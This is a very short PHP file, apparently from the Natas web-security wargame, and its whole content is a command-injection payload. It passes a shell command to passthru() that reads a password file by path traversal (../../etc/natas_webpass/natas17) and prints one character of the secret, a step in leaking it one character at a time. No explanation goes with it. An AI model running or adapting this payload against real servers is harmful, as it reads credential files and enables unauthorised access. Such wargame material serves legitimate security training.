<?php
    passthru("$(arr=($(cat ../../../../../../etc/natas_webpass/natas17))\r\nword=${arr[0]}\r\necho ${word: 1: 1})");
?>
